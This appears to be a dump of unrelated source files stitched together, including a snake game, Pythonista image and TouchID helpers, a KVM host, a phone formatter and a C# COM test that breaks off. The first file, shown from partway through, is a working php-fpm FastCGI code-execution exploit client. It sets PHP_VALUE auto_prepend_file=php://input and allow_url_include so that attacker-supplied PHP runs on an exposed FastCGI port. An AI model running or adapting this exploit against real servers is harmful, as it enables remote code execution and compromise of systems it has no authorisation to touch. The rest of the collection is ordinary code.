 return record


 def request(self, nameValuePairs={}, post=''):
 if not self.__connect():
 print('connect failure! please check your fasctcgi-server !!')
 return


 requestId = random.randint(1, (1 << 16) - 1)
 self.requests[requestId] = dict()
 request = b""""
 beginFCGIRecordContent = bchr(0) \
 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
 + bchr(self.keepalive) \
 + bchr(0) * 5
 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
 beginFCGIRecordContent, requestId)
 paramsRecord = b''
 if nameValuePairs:
 for (name, value) in nameValuePairs.items():
 name = force_bytes(name)
 value = force_bytes(value)
 paramsRecord += self.__encodeNameValueParams(name, value)


 if paramsRecord:
 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)


 if post:
 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)


 self.sock.send(request)
 self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND
 self.requests[requestId]['response'] = b''
 return self.__waitForResponse(requestId)


 def __waitForResponse(self, requestId):
 data = b''
 while True:
 buf = self.sock.recv(512)
 if not len(buf):
 break
 data += buf


 data = BytesIO(data)
 while True:
 response = self.__decodeFastCGIRecord(data)
 if not response:
 break
 if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \
 or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
 if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
 self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR
 if requestId == int(response['requestId']):
 self.requests[requestId]['response'] += response['content']
 if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:
 self.requests[requestId]
 return self.requests[requestId]['response']


 def __repr__(self):
 return ""fastcgi connect host:{} port:{}"".format(self.host, self.port)




if __name__ == '__main__':
 parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')
 parser.add_argument('host', help='Target host, such as 127.0.0.1')
 parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')
 parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php phpinfo(); exit; ?>')
 parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)


 args = parser.parse_args()


 client = FastCGIClient(args.host, args.port, 3, 0)
 params = dict()
 documentRoot = ""/""
 uri = args.file
 content = args.code
 params = {
 'GATEWAY_INTERFACE': 'FastCGI/1.0',
 'REQUEST_METHOD': 'POST',
 'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
 'SCRIPT_NAME': uri,
 'QUERY_STRING': '',
 'REQUEST_URI': uri,
 'DOCUMENT_ROOT': documentRoot,
 'SERVER_SOFTWARE': 'php/fcgiclient',
 'REMOTE_ADDR': '127.0.0.1',
 'REMOTE_PORT': '9985',
 'SERVER_ADDR': '127.0.0.1',
 'SERVER_PORT': '80',
 'SERVER_NAME': ""localhost"",
 'SERVER_PROTOCOL': 'HTTP/1.1',
 'CONTENT_TYPE': 'application/text',
 'CONTENT_LENGTH': ""%d"" % len(content),
 'PHP_VALUE': 'auto_prepend_file = php://input',
 'PHP_ADMIN_VALUE': 'allow_url_include = On'
    }
 response = client.request(params, content)
 print(force_text(response))
"
"snake_game.py
","# Simple Snake Game in Python 3 for Beginners
# By @TokyoEdTech


import turtle
import time
import random


delay = 0.1


# Score
score = 0
high_score = 0


# Set up the screen
wn = turtle.Screen()
wn.title(""Snake Game by @TokyoEdTech"")
wn.bgcolor(""green"")
wn.setup(width=600, height=600)
wn.tracer(0) # Turns off the screen updates


# Snake head
head = turtle.Turtle()
head.speed(0)
head.shape(""square"")
head.color(""black"")
head.penup()
head.goto(0,0)
head.direction = ""stop""


# Snake food
food = turtle.Turtle()
food.speed(0)
food.shape(""circle"")
food.color(""red"")
food.penup()
food.goto(0,100)


segments = []


# Pen
pen = turtle.Turtle()
pen.speed(0)
pen.shape(""square"")
pen.color(""white"")
pen.penup()
pen.hideturtle()
pen.goto(0, 260)
pen.write(""Score: 0  High Score: 0"", align=""center"", font=(""Courier"", 24, ""normal""))


# Functions
def go_up():
 if head.direction != ""down"":
 head.direction = ""up""


def go_down():
 if head.direction != ""up"":
 head.direction = ""down""


def go_left():
 if head.direction != ""right"":
 head.direction = ""left""


def go_right():
 if head.direction != ""left"":
 head.direction = ""right""


def move():
 if head.direction == ""up"":
 y = head.ycor()
 head.sety(y + 20)


 if head.direction == ""down"":
 y = head.ycor()
 head.sety(y - 20)


 if head.direction == ""left"":
 x = head.xcor()
 head.setx(x - 20)


 if head.direction == ""right"":
 x = head.xcor()
 head.setx(x + 20)


# Keyboard bindings
wn.listen()
wn.onkeypress(go_up, ""w"")
wn.onkeypress(go_down, ""s"")
wn.onkeypress(go_left, ""a"")
wn.onkeypress(go_right, ""d"")


# Main game loop
while True:
 wn.update()


 # Check for a collision with the border
 if head.xcor()>290 or head.xcor()<-290 or head.ycor()>290 or head.ycor()<-290:
 time.sleep(1)
 head.goto(0,0)
 head.direction = ""stop""


 # Hide the segments
 for segment in segments:
 segment.goto(1000, 1000)
 
 # Clear the segments list
 segments.clear()


 # Reset the score
 score = 0


 # Reset the delay
 delay = 0.1


 pen.clear()
 pen.write(""Score: {}  High Score: {}"".format(score, high_score), align=""center"", font=(""Courier"", 24, ""normal"")) 




 # Check for a collision with the food
 if head.distance(food) < 20:
 # Move the food to a random spot
 x = random.randint(-290, 290)
 y = random.randint(-290, 290)
 food.goto(x,y)


 # Add a segment
 new_segment = turtle.Turtle()
 new_segment.speed(0)
 new_segment.shape(""square"")
 new_segment.color(""grey"")
 new_segment.penup()
 segments.append(new_segment)


 # Shorten the delay
 delay -= 0.001


 # Increase the score
 score += 10


 if score > high_score:
 high_score = score
 
 pen.clear()
 pen.write(""Score: {}  High Score: {}"".format(score, high_score), align=""center"", font=(""Courier"", 24, ""normal"")) 


 # Move the end segments first in reverse order
 for index in range(len(segments)-1, 0, -1):
 x = segments[index-1].xcor()
 y = segments[index-1].ycor()
 segments[index].goto(x, y)


 # Move segment 0 to where the head is
 if len(segments) > 0:
 x = head.xcor()
 y = head.ycor()
 segments[0].goto(x,y)


 move()    


 # Check for head collision with the body segments
 for segment in segments:
 if segment.distance(head) < 20:
 time.sleep(1)
 head.goto(0,0)
 head.direction = ""stop""
 
 # Hide the segments
 for segment in segments:
 segment.goto(1000, 1000)
 
 # Clear the segments list
 segments.clear()


 # Reset the score
 score = 0


 # Reset the delay
 delay = 0.1
 
 # Update the score display
 pen.clear()
 pen.write(""Score: {}  High Score: {}"".format(score, high_score), align=""center"", font=(""Courier"", 24, ""normal""))


 time.sleep(delay)


wn.mainloop()
"
"core_image.py
","'''
This module provides a Python wrapper around CIImage and CIFilter for using CoreImage filters from Pythonista more easily.

How to use:

1) Create a CImage object. The constructor accepts either a file path, a ui.Image, PIL.Image.Image, or photos.Asset object. Example:

>>> # From a photo:
>>> img = CImage(photos.pick_asset())
>>> # From a ui.Image:
>>> img2 = CImage(ui.Image.named('test:Peppers'))
>>> # From a file:
>>> img3 = CImage('MyImage.jpg')

2) Apply a filter using the CImage object's filter() method. The list of available filters and their parameter names can be found here:
https://developer.apple.com/library/content/documentation/GraphicsImaging/Reference/CoreImageFilterReference/index.html

The result is another CImage object that can be filtered again, to build a filter chain. When all filters have been applied, you can 
use the show() method to display the result in the console, or save_jpeg()/save_png() to save it to a file.

Filter parameters are passed to the filter() method as keyword arguments. If a parameter name begins with ""input"" (almost all do),
that prefix can be left out for better readability (e.g. inputSaturation=... becomes just saturation=...).

The filter reference will tell you which type each parameter should be. This can be translated to Python as follows:

NSNumber:		int or float
CIVector:		tuple of numbers (int or float), often x/y coordinates
CIImage:		CImage object
CIColor:		Either a color string (e.g. '#ff000', 'red'), a tuple with 3 or 4 numbers (rgb[a]) in the range 0.0-1.0,
			or a number (grayscale value)
NSString:		str
NSData:			bytes or str (the latter will be utf-8-encoded)

Example:

>>> img = CImage(photos.pick_asset())
>>> img2 = img.filter('CIColorControls', saturation=2.0, contrast=1.5)
>>> img3 = img2.filter('CIGaussianBlur', radius=10)
>>> img3.show()

The inputImage parameter is always set automatically. If a filter doesn't have an inputImage parameter
(e.g. a gradient or barcode generator), you can just create an empty CImage and ""filter"" that.
Example:

>>> empty = CImage()
>>> qrcode = empty.filter('CIQRCodeGenerator', message='Hello World')
>>> qrcode.show()
'''


from objc_util import *
import photos
import os
import ui
import PIL.Image
import tempfile
import numbers


class CImage(object):
 def __init__(self, img_or_path=None):
 CIImage = ObjCClass('CIImage')
 if img_or_path is None:
 self.ci_img = CIImage.emptyImage()
 return
 if isinstance(img_or_path, ObjCInstance):
 if img_or_path.isKindOfClass_(CIImage):
 self.ci_img = img_or_path
 return
 if isinstance(img_or_path, PIL.Image.Image):
 buffer = io.BytesIO()
 img_or_path.save(buffer, 'PNG')
 img_or_path = ui.Image.from_data(buffer)
 if isinstance(img_or_path, photos.Asset):
 img_or_path = img_or_path.get_ui_image()
 if isinstance(img_or_path, ui.Image):
 self.ci_img = CIImage.imageWithCGImage_(ObjCInstance(img_or_path).CGImage())
 elif isinstance(img_or_path, str):
 file_url = nsurl(os.path.abspath(img_or_path))
 self.ci_img = CIImage.imageWithContentsOfURL_(file_url)
 else:
 raise TypeError('unsupported type for initializing CImage')


 def filter(self, name, **params):
 CIFilter = ObjCClass('CIFilter')
 CIVector = ObjCClass('CIVector')
 CIColor = ObjCClass('CIColor')
 filter = CIFilter.filterWithName_(name)
 if not filter:
 raise ValueError('Invalid filter name')
 filter.setDefaults()
 input_keys = [str(k) for k in filter.inputKeys()]
 attrs = filter.attributes()
 input_key_types = {
 str(k): str(attrs[k]['CIAttributeClass'])
 for k in input_keys
		}
 supported_types = {
 'CIImage': CImage,
 'CIVector': tuple,
 'CIColor': (tuple, numbers.Number, str),
 'NSNumber': numbers.Number,
 'NSData': (bytes, str),
 'NSString': str
		}
 if 'inputImage' in input_keys:
 filter.setValue_forKey_(self.ci_img, 'inputImage')
 for key, value in params.items():
 if key not in input_keys:
 key = 'input' + key[0].upper() + key[1:]
 if key not in input_keys:
 raise ValueError('""%s"" is not a valid parameter for %s' % (key, name))
 param_type = input_key_types[key]
 if param_type not in supported_types:
 raise TypeError('Parameters of type %s are not supported' % param_type)
 expected_type = supported_types[param_type]
 type_matches = isinstance(value, expected_type)
 if not type_matches:
 raise TypeError(
 'Incorrect type for %s parameter (expected %s, got %s)' %
					(key, expected_type, type(value))
				)
 if param_type == 'CIColor':
 if isinstance(value, numbers.Number):
 value = (value, value, value, 1.0)
 elif isinstance(value, str):
 value = ui.parse_color(value)
 if not all(isinstance(n, numbers.Number) for n in value):
 raise TypeError('All color components must be numbers')
 if len(value) == 3:
 ci_color = CIColor.colorWithRed_green_blue_(*value)
 elif len(value) == 4:
 ci_color = CIColor.colorWithRed_green_blue_alpha_(*value)
 else:
 raise TypeError('Color must be a tuple with 3 or 4 RGB(A) values')
 filter.setValue_forKey_(ci_color, key)
 elif param_type == 'CIImage':
 filter.setValue_forKey_(value.ci_img, key)
 elif param_type == 'CIVector':
 arr = (CGFloat * len(value))(*value)
 vector = CIVector.vectorWithValues_count_(arr, len(value))
 filter.setValue_forKey_(vector, key)
 elif param_type == 'NSData' and isinstance(value, str):
 filter.setValue_forKey_(value.encode('utf-8'), key)
 else:
 filter.setValue_forKey_(value, key)
 out_img = filter.valueForKey_('outputImage')
 return CImage(out_img)
 
 def _uiimage_rep(self):
 # Internal helper method for save_jpeg and save_png
 ctx = ObjCClass('CIContext').context()
 extent = self.ci_img.extent()
 m = ctx.outputImageMaximumSize()
 if extent.size.width > m.width or extent.size.height > m.height:
 # This is probably an infinite image, render *something*...
 extent = CGRect(CGPoint(0, 0), CGSize(1024, 1024))
 cg_img = ctx.createCGImage_fromRect_(self.ci_img, extent)
 ui_img = UIImage.imageWithCGImage_(cg_img)
 c.CGImageRelease.argtypes = [c_void_p]
 c.CGImageRelease.restype = None
 c.CGImageRelease(cg_img)
 return ui_img
 
 def save_jpeg(self, filename='output.jpg', quality=1.0):
 ui_img = self._uiimage_rep()
 c.UIImageJPEGRepresentation.argtypes = [c_void_p, CGFloat]
 c.UIImageJPEGRepresentation.restype = c_void_p
 data = ObjCInstance(c.UIImageJPEGRepresentation(ui_img.ptr, quality))
 filename = os.path.abspath(filename)
 return data.writeToFile_atomically_(filename, True)
 
 def save_png(self, filename='output.png'):
 ui_img = self._uiimage_rep()
 c.UIImagePNGRepresentation.argtypes = [c_void_p]
 c.UIImagePNGRepresentation.restype = c_void_p
 data = ObjCInstance(c.UIImagePNGRepresentation(ui_img.ptr))
 filename = os.path.abspath(filename)
 return data.writeToFile_atomically_(filename, True)


 def show(self):
 temp_path = os.path.join(tempfile.gettempdir(), 'cimage_show.png')
 saved = self.save_png(temp_path)
 if saved:
 ui.Image.named(temp_path).show()
 else:
 raise ValueError('Image could not be saved (may be empty)')




def main():
 img = CImage(ui.Image.named('test:Mandrill'))
 img = img.filter('CITwirlDistortion', center=(256, 256), radius=150)
 img = img.filter('CICMYKHalftone')
 img.show()


if __name__ == '__main__':
 main()
 
 
==<SEPERATOR>==
DownloadPhotosFromCloud.py
# Quick workaround for photos module (Pythonista) not downloading photos from iCloud


import photos
from objc_util import ObjCClass, ObjCInstance, ObjCBlock


def download_cloud_asset(asset):
 PHImageManager = ObjCClass('PHImageManager')
 PHImageRequestOptions = ObjCClass('PHImageRequestOptions')
 ph_asset = ObjCInstance(asset)
 ph_image_mgr = PHImageManager.defaultManager()
 req_options = PHImageRequestOptions.alloc().init().autorelease()
 req_options.synchronous = True
 req_options.networkAccessAllowed = True
 def handler_f(*args):
 pass
 handler_block = ObjCBlock(handler_f)
 ph_image_mgr.requestImageDataForAsset(ph_asset, options=req_options, resultHandler=handler_block)


def main():
 a = photos.get_assets()[-1]
 print('Downloading data for last asset... (if needed)')
 download_cloud_asset(a)
 print('Done')


if __name__ == '__main__':
 main()
==<SEPERATOR>==
touchid.py
# coding: utf-8
from objc_util import * 
import threading


NSBundle = ObjCClass('NSBundle')
LocalAuthentication = NSBundle.bundleWithPath_('/System/Library/Frameworks/LocalAuthentication.framework')
LocalAuthentication.load()
LAContext = ObjCClass('LAContext')


# authenticate() will raise one of these exceptions when authentication
# fails. They all derive from AuthFailedException, so you can catch that
# if you don't care about the failure reason, but you could also handle
# cancellation differently, for example.
class AuthFailedException (Exception): pass
class AuthCancelledException (AuthFailedException): pass
class AuthTimeoutException (AuthFailedException): pass
class AuthNotAvailableException (AuthFailedException): pass
class AuthFallbackMechanismSelectedException (AuthFailedException): pass


def is_available():
 '''Return True if TouchID authentication is available, False otherwise'''
 context = LAContext.new().autorelease()
 return bool(context.canEvaluatePolicy_error_(1, None))


def authenticate(reason='', allow_passcode=True, timeout=None):
 '''Authenticate the user via TouchID or passcode. Returns True on success, raises AuthFailedException (or a subclass) otherwise.'''
 if not is_available():
 raise AuthNotAvailableException('Touch ID is not available.')
 policy = 2 if allow_passcode else 1
 context = LAContext.new().autorelease()
 event = threading.Event()
 result = {}
 def callback(_cmd, success, _error):
 result['success'] = success
 if _error:
 error = ObjCInstance(_error)
 result['error'] = error
 event.set()
 handler = ObjCBlock(callback, restype=None, argtypes=[c_void_p, c_bool, c_void_p])
 context.evaluatePolicy_localizedReason_reply_(policy, reason, handler)
 if not event.wait(timeout):
 #NOTE: invalidate() is a private method (there's apparently no public API to cancel the TouchID dialog)
 context.invalidate()
 raise AuthTimeoutException('Timeout')
 success = result.get('success', False)
 error = result.get('error')
 if success:
 return True
 elif error:
 error_code = error.code()
 if error_code == -2:
 raise AuthCancelledException('Cancelled by user')
 elif error_code == -3:
 raise AuthFallbackMechanismSelectedException('Fallback authentication mechanism selected')
 else:
 desc = error.localizedDescription() or 'Unknown error'
 raise AuthFailedException(desc)
 else:
 raise AuthFailedException('Unknown error')


# Demo:
def main():
 try:
 reason = 'We need you fingerprint to ste...ehm... to log you in. You have 10 seconds.'
 authenticate(reason, allow_passcode=True, timeout=10)
 print 'Success!'
 except AuthFailedException, e:
 print e


if __name__ == '__main__':
 main()
==<SEPERATOR>==
movingAvg.c
#include <stdio.h>


int movingAvg(int *ptrArrNumbers, long *ptrSum, int pos, int len, int nextNum)
{
 //Subtract the oldest number from the prev sum, add the new number
 *ptrSum = *ptrSum - ptrArrNumbers[pos] + nextNum;
 //Assign the nextNum to the position in the array
 ptrArrNumbers[pos] = nextNum;
 //return the average
 return *ptrSum / len;
}


int main(int argc, char *argv[])
{
 // a sample array of numbers. The represent ""readings"" from a sensor over time
 int sample[] = {50, 10, 20, 18, 20, 100, 18, 10, 13, 500, 50, 40, 10};
 // the size of this array represents how many numbers will be used
 // to calculate the average
 int arrNumbers[5] = {0};


 int pos = 0;
 int newAvg = 0;
 long sum = 0;
 int len = sizeof(arrNumbers) / sizeof(int);
 int count = sizeof(sample) / sizeof(int);


 for(int i = 0; i < count; i++){
 newAvg = movingAvg(arrNumbers, &sum, pos, len, sample[i]);
 printf(""The new average is %d\n"", newAvg);
 pos++;
 if (pos >= len){
 pos = 0;
    }
  }


 return 0;
}
"
"autoDecline.js
","const userIdsThatCanCall = [];


const client = Roblox.RealTime.Factory.GetClient();
client.Subscribe(""CallNotification"", callDetail => {
 if (callDetail.Type === ""NewCall"" && 
 (callDetail.CallerId !== Roblox.CurrentUser.userId && !userIdsThatCanCall.includes(callDetail.CallerId))
 ) {
 CoreUtilities.httpService.post({ 
 url: ""https://apis.roblox.com/call/v1/decline-call"", 
 withCredentials: true 
 }, { callId: callDetail.CallId });
 }
})
"
"kvm-host.c
","#define _GNU_SOURCE
#include <asm/bootparam.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/kvm.h>
#include <linux/kvm_para.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>


struct guest {
 int kvm_fd;
 int vm_fd;
 int vcpu_fd;
 void *mem;
};


static int guest_error(struct guest *g, const char *fmt, ...) {
 va_list args;
 va_start(args, fmt);
 vfprintf(stderr, fmt, args);
 fprintf(stderr, "", errno: %d\n"", errno);
 va_end(args);
 return -1;
}


static int guest_init_regs(struct guest *g) {
 struct kvm_regs regs;
 struct kvm_sregs sregs;
 if (ioctl(g->vcpu_fd, KVM_GET_SREGS, &(sregs)) < 0) {
 return guest_error(g, ""failed to get registers"");
  }


 sregs.cs.base = 0;
 sregs.cs.limit = ~0;
 sregs.cs.g = 1;


 sregs.ds.base = 0;
 sregs.ds.limit = ~0;
 sregs.ds.g = 1;


 sregs.fs.base = 0;
 sregs.fs.limit = ~0;
 sregs.fs.g = 1;


 sregs.gs.base = 0;
 sregs.gs.limit = ~0;
 sregs.gs.g = 1;


 sregs.es.base = 0;
 sregs.es.limit = ~0;
 sregs.es.g = 1;


 sregs.ss.base = 0;
 sregs.ss.limit = ~0;
 sregs.ss.g = 1;


 sregs.cs.db = 1;
 sregs.ss.db = 1;
 sregs.cr0 |= 1; /* enable protected mode */


 if (ioctl(g->vcpu_fd, KVM_SET_SREGS, &sregs) < 0) {
 return guest_error(g, ""failed to set special registers"");
  }


 if (ioctl(g->vcpu_fd, KVM_GET_REGS, &(regs)) < 0) {
 return guest_error(g, ""failed to get registers"");
  }


 regs.rflags = 2;
 regs.rip = 0x100000;
 regs.rsi = 0x10000;


 if (ioctl(g->vcpu_fd, KVM_SET_REGS, &(regs)) < 0) {
 return guest_error(g, ""failed to set registers"");
  }
 return 0;
}


static int guest_init_cpu_id(struct guest *g) {
 struct {
 uint32_t nent;
 uint32_t padding;
 struct kvm_cpuid_entry2 entries[100];
  } kvm_cpuid;
 kvm_cpuid.nent = sizeof(kvm_cpuid.entries) / sizeof(kvm_cpuid.entries[0]);
 ioctl(g->kvm_fd, KVM_GET_SUPPORTED_CPUID, &kvm_cpuid);


 for (unsigned int i = 0; i < kvm_cpuid.nent; i++) {
 struct kvm_cpuid_entry2 *entry = &kvm_cpuid.entries[i];
 if (entry->function == KVM_CPUID_SIGNATURE) {
 entry->eax = KVM_CPUID_FEATURES;
 entry->ebx = 0x4b4d564b; // KVMK
 entry->ecx = 0x564b4d56; // VMKV
 entry->edx = 0x4d;       // M
    }
  }
 ioctl(g->vcpu_fd, KVM_SET_CPUID2, &kvm_cpuid);
 return 0;
}




int guest_init(struct guest *g) {
 if ((g->kvm_fd = open(""/dev/kvm"", O_RDWR)) < 0) {
 return guest_error(g, ""failed to open /dev/kvm"");
  }


 if ((g->vm_fd = ioctl(g->kvm_fd, KVM_CREATE_VM, 0)) < 0) {
 return guest_error(g, ""failed to create vm"");
  }


 if (ioctl(g->vm_fd, KVM_SET_TSS_ADDR, 0xffffd000) < 0) {
 return guest_error(g, ""failed to set tss addr"");
  }


 __u64 map_addr = 0xffffc000;
 if (ioctl(g->vm_fd, KVM_SET_IDENTITY_MAP_ADDR, &map_addr) < 0) {
 return guest_error(g, ""failed to set identity map addr"");
  }


 if (ioctl(g->vm_fd, KVM_CREATE_IRQCHIP, 0) < 0) {
 return guest_error(g, ""failed to create irq chip"");
  }


 struct kvm_pit_config pit = {
      .flags = 0,
  };
 if (ioctl(g->vm_fd, KVM_CREATE_PIT2, &pit) < 0) {
 return guest_error(g, ""failed to create i8254 interval timer"");
  }


 g->mem = mmap(NULL, 1 << 30, PROT_READ | PROT_WRITE,
 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
 if (g->mem == NULL) {
 return guest_error(g, ""failed to mmap vm memory"");
  }


 struct kvm_userspace_memory_region region = {
      .slot = 0,
      .flags = 0,
      .guest_phys_addr = 0,
      .memory_size = 1 << 30,
      .userspace_addr = (__u64)g->mem,
  };
 if (ioctl(g->vm_fd, KVM_SET_USER_MEMORY_REGION, &region) < 0) {
 return guest_error(g, ""failed to set user memory region"");
  }


 if ((g->vcpu_fd = ioctl(g->vm_fd, KVM_CREATE_VCPU, 0)) < 0) {
 return guest_error(g, ""failed to create vcpu"");
  }


 guest_init_regs(g);
 guest_init_cpu_id(g);


 return 0;
}


int guest_load(struct guest *g, const char *image_path) {
 size_t datasz;
 void *data;
 int fd = open(image_path, O_RDONLY);
 if (fd < 0) {
 return 1;
  }
 struct stat st;
 fstat(fd, &st);
 data = mmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
 datasz = st.st_size;
 close(fd);


 struct boot_params *boot =
      (struct boot_params *)(((uint8_t *)g->mem) + 0x10000);
 void *cmdline = (void *)(((uint8_t *)g->mem) + 0x20000);
 void *kernel = (void *)(((uint8_t *)g->mem) + 0x100000);


 memset(boot, 0, sizeof(struct boot_params));
 memmove(boot, data, sizeof(struct boot_params));
 size_t setup_sectors = boot->hdr.setup_sects;
 size_t setupsz = (setup_sectors + 1) * 512;
 boot->hdr.vid_mode = 0xFFFF; // VGA
 boot->hdr.type_of_loader = 0xFF;
 boot->hdr.ramdisk_image = 0x0;
 boot->hdr.ramdisk_size = 0x0;
 boot->hdr.loadflags |= CAN_USE_HEAP | 0x01 | KEEP_SEGMENTS;
 boot->hdr.heap_end_ptr = 0xFE00;
 boot->hdr.ext_loader_ver = 0x0;
 boot->hdr.cmd_line_ptr = 0x20000;
 memset(cmdline, 0, boot->hdr.cmdline_size);
 memcpy(cmdline, ""console=ttyS0"", 14);
 memmove(kernel, (char *)data + setupsz, datasz - setupsz);
 return 0;
}


void guest_exit(struct guest *g) {
 close(g->kvm_fd);
 close(g->vm_fd);
 close(g->vcpu_fd);
 munmap(g->mem, 1 << 30);
}


int guest_run(struct guest *g) {
 int run_size = ioctl(g->kvm_fd, KVM_GET_VCPU_MMAP_SIZE, 0);
 struct kvm_run *run =
 mmap(0, run_size, PROT_READ | PROT_WRITE, MAP_SHARED, g->vcpu_fd, 0);
 for (;;) {
 int ret = ioctl(g->vcpu_fd, KVM_RUN, 0);
 if (ret < 0) {
 return guest_error(g, ""kvm_run failed"");
    }


 switch (run->exit_reason) {
 case KVM_EXIT_IO:
 if (run->io.port == 0x3f8 && run->io.direction == KVM_EXIT_IO_OUT) {
 uint32_t size = run->io.size;
 uint64_t offset = run->io.data_offset;
 printf(""%.*s"", size * run->io.count, (char *)run + offset);
      } else if (run->io.port == 0x3f8 + 5 &&
 run->io.direction == KVM_EXIT_IO_IN) {
 char *value = (char *)run + run->io.data_offset;
 *value = 0x20;
      }
 break;
 case KVM_EXIT_SHUTDOWN:
 printf(""shutdown\n"");
 return 0;
 default:
 printf(""reason: %d\n"", run->exit_reason);
 return -1;
    }
  }
}


int main(int argc, char *argv[]) {
 int r;
 struct guest vm;


 r = guest_init(&vm);
 if (r < 0) {
 fprintf(stderr, ""failed to initialize guest vm: %d, errno=%d\n"", r, errno);
 return 1;
  }


 r = guest_load(&vm, argv[1]);
 if (r < 0) {
 fprintf(stderr, ""failed to load guest image: %d, errno=%d\n"", r, errno);
 return 1;
  }


 guest_run(&vm);
 guest_exit(&vm);
 return 0;
}
==<SEPERATOR>==
BrPhoneNumberFormatter.java
/**
 * Adapted to BR phone format from the class
 * UsPhoneNumberFormatter by Samik Bandyopadhyay:
 * http://stackoverflow.com/a/23659268/332839
 */
public class BrPhoneNumberFormatter implements TextWatcher {


 final int MAX_LENGTH = 11;


 //This TextWatcher sub-class formats entered numbers as (41) 1234(5)?-6789
 private boolean mFormatting; // this is a flag which prevents the stack(onTextChanged)
 private boolean clearFlag;
 private int mLastStartLocation;
 private String mLastBeforeText;
 private WeakReference<EditText> mWeakEditText;


 public BrPhoneNumberFormatter(WeakReference<EditText> weakEditText) {
 this.mWeakEditText = weakEditText;
    }


 @Override
 public void beforeTextChanged(CharSequence s, int start, int count,
 int after) {
 if (after == 0 && s.toString().equals(""("")) {
 clearFlag = true;
        }
 mLastStartLocation = start;
 mLastBeforeText = s.toString();
    }


 @Override
 public void onTextChanged(CharSequence s, int start, int before,
 int count) {
 // TODO: Do nothing
    }


 @Override
 public void afterTextChanged(Editable s) {
 // Make sure to ignore calls to afterTextChanged
 // caused by the work done below
 if (!mFormatting) {
 mFormatting = true;
 int curPos = mLastStartLocation;
 String beforeValue = mLastBeforeText;
 String currentValue = s.toString();
 String formattedValue = formatUsNumber(s);
 if (currentValue.length() > beforeValue.length()) {
 int setCusorPos = formattedValue.length()
                        - (beforeValue.length() - curPos);
 mWeakEditText.get().setSelection(setCusorPos < 0 ? 0 : setCusorPos);
            } else {
 int setCusorPos = formattedValue.length()
                        - (currentValue.length() - curPos);
 if(setCusorPos > 0 && !Character.isDigit(formattedValue.charAt(setCusorPos -1))){
 setCusorPos--;
                }
 mWeakEditText.get().setSelection(setCusorPos < 0 ? 0 : setCusorPos);
            }
 mFormatting = false;
        }
    }


 private String formatUsNumber(Editable text) {
 StringBuilder formattedString = new StringBuilder();


 // Remove everything except digits
 int p = 0;
 while (p < text.length()) {
 char ch = text.charAt(p);
 if (!Character.isDigit(ch)) {
 text.delete(p, p + 1);
            } else {
 p++;
            }
        }


 // Now only digits are remaining
 String allDigitString = text.toString();


 int totalDigitCount = allDigitString.length();


 if(totalDigitCount > MAX_LENGTH) {
 allDigitString = allDigitString.substring(0, MAX_LENGTH);
 totalDigitCount--;
        }


 // Check if we are dealing with the new phone format, with an additional digit
 boolean isLonger = totalDigitCount == MAX_LENGTH;
 int dashAfter = isLonger ? 5 : 4;


 if (totalDigitCount == 0
                || (totalDigitCount > 11 && !allDigitString.startsWith(""(""))
                || totalDigitCount > 12) {
 // May be the total length of input length is greater than the
 // expected value so we'll remove all formatting
 text.clear();
 text.append(allDigitString);
 return allDigitString;
        }


 int alreadyPlacedDigitCount = 0;
 // Only ( is remaining and user pressed backspace and so we clear
 // the edit text.
 if (allDigitString.equals(""("") && clearFlag) {
 text.clear();
 clearFlag = false;
 return """";
        }


 // The first 2 numbers beyond ) must be enclosed in brackets ""()""
 if (totalDigitCount - alreadyPlacedDigitCount > 2) {
 formattedString.append(""(""
                    + allDigitString.substring(alreadyPlacedDigitCount,
 alreadyPlacedDigitCount + 2) + "") "");
 alreadyPlacedDigitCount += 2;
        }


 // There must be a '-' inserted after the next 4 or 5 numbers
 // (5 in case we are dealing with the new longer phone format: (xx) xxxxx-xxxx
 if (totalDigitCount - alreadyPlacedDigitCount > dashAfter) {
 formattedString.append(allDigitString.substring(
 alreadyPlacedDigitCount, alreadyPlacedDigitCount + dashAfter)
                    + ""-"");
 alreadyPlacedDigitCount += dashAfter;
        }


 // All the required formatting is done so we'll just copy the
 // remaining digits.
 if (totalDigitCount > alreadyPlacedDigitCount) {
 formattedString.append(allDigitString
                    .substring(alreadyPlacedDigitCount));
        }


 text.clear();
 text.append(formattedString.toString());
 return formattedString.toString();
    }
}
final EditText telephone = (EditText) findViewById(R.id.telephone);


BrPhoneNumberFormatter addLineNumberFormatter = new BrPhoneNumberFormatter(new WeakReference<EditText>(telephone));
telephone.addTextChangedListener(addLineNumberFormatter);
"
"idispatch.cs
","using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;


namespace ConsoleApplication3
{
 class Program
 {
 [STAThread]
 static void Main(string[] args)
 {
            Console.WriteLine(""Begin test..."");


 //
 // Test using shell
 //
 object shell = Activator.CreateInstance(Marshal.GetTypeFromCLSID(new Guid(""{13709620-C279-11CE-A49E-444553540000}"")));


 object application = shell.InvokeDispMember(""Application"", new object[] { }, null, InvokeMemberHelper.MethodKind.PropertyGet);
 if (application != null)
                Console.WriteLine(""Application property success!"");
 else
                Console.WriteLine(""Application property returns null!"");


